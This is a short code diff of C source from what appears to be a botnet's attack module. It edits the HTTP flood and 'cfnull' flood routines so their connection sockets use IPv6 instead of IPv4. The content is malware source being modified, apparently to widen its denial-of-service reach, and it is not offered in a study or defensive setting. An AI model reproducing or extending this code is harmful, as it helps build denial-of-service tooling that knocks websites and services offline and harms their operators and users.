@@ -156,7 +156,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                 if (conn->fd != -1)
                     close(conn->fd);
-                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+                if ((conn->fd = socket(AF_INET6, SOCK_STREAM, 0)) == -1)
                     continue;
 
                 fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
@@ -939,7 +939,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
                 if (conn->fd != -1)
                     close(conn->fd);
-                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+                if ((conn->fd = socket(AF_INET6, SOCK_STREAM, 0)) == -1)
                     continue;
 
                 fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
